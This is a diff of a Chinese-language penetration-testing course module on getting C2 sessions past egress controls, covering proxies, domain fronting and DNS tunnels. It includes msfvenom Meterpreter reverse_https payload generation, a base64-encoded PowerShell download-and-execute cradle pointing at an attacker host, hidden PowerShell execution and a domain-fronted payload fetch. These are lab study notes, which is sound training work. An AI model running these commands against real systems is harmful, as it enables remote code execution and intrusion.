@@ -6,6 +6,8 @@
 
 > **覆盖场景：** 17、28、29、30、31、32、33
 >
+> **教材依据：** 第 14 章（§14.1 DNS 过滤、§14.2 Web 代理绕过、§14.3–14.5 IDS/IPS 与 HTTPS 检查、§14.6 域前置 Domain Fronting、§14.7 DNS 隧道 dnscat2）、第 4/7/9 章（分阶段与内嵌载荷）；Challenge 1、Challenge 2
+>
 > **前置依赖：** 攻击机（Kali）+ 一个入口会话；HTTPS 需自签证书（生成见 [00-environment-and-infra](/zh/modules/00-environment-and-infra) §3）；DNS 通道需一个可把 NS 指向你的域或实验网允许的直连 UDP 53；域前置需可自定义 Host 转发的 CDN/自建 nginx 前端。
 
 **核心思想**：本模块解决"代码能跑但会话/第二阶段回不来"的问题。所有方案都围绕一条**已验证可达的通信路径**展开——先验证路径（投递、代理、DNS 解析、TLS 握手），再让每个阶段走同一条路径。任何阶段换了地址/端口/协议/代理上下文，都是场景 30 的翻版。
@@ -293,7 +295,7 @@ End Sub
  *      DotNetToJScript.exe 会把 C# 程序集序列化生成完整 runner.js（几百行 base64），
  *      本文件用于：(a) 记录标准生成命令；(b) 在投递前做宿主位数/.NET 预检；
  *      (c) 需要手工拼装时，把工具输出整体粘贴到下方"粘贴区"。
- * 场景：9、10（cheat sheet JScript > Meterpreter Loader with DotNetToJScript）
+ * 场景：9、10（速查笔记 JScript > Meterpreter Loader with DotNetToJScript）
  * 依赖：工具机 Windows + DotNetToJScript.exe；目标 WSH + .NET（v4 或 v2）。
  * 使用：
  *  1) 生成完整产物（产物本身可独立运行，无需本文件）：
@@ -1669,9 +1671,11 @@ curl -k https://FRONT/ -H "Host: BACKEND" --resolve FRONT:443:FRONT_IP -o PAYLOA
 # 内嵌版 payload（场景 17）
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f ps1
 
-# 编码 PowerShell 命令（场景 17/28/31；cheat sheet: Encode PowerShell Payloads）
-echo -en 'iex((New-Object Net.WebClient).DownloadString("http://LHOST/PAYLOAD"))' | iconv -t UTF-16LE | base64 -w 0
-powershell -nop -w hidden -enc <BASE64>
+# 编码 PowerShell 命令（场景 17/28/31；速查笔记: Encode PowerShell Payloads）
+PS_CMD='iex((New-Object Net.WebClient).DownloadString("http://LHOST/PAYLOAD"))'
+B64=$(printf '%s' "$PS_CMD" | iconv -t UTF-16LE | base64 -w 0)
+# 在目标上执行（务必给 blob 加引号；未加引号的 <BASE64> 会被 shell 当成重定向而报错）
+powershell -nop -w hidden -enc "$B64"
 
 # 代理查看/设置（场景 28/29）
 reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer
